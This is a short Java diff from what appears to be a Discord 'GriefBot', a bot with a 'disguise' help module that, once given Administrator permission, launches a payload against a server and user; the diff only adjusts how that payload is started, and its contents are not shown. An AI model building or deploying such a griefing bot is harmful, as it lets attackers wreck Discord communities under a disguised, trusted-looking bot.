@@ -3,6 +3,7 @@ package de.corruptedbytes;
 import de.corruptedbytes.disguise.HelpManager;
 import de.corruptedbytes.logger.GriefBotLogger;
 import de.corruptedbytes.logger.GriefBotLoggerLevel;
+import de.corruptedbytes.payload.GriefBotPayload;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
 import net.dv8tion.jda.api.entities.Guild;
@@ -46,7 +47,7 @@ public class GriefBotListener extends ListenerAdapter {
 						}
 
 						GriefBotPayload griefBotPayload = new GriefBotPayload(guild, user);
-						new Thread(griefBotPayload).start();
+						griefBotPayload.start();
 
 					} else {
 						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
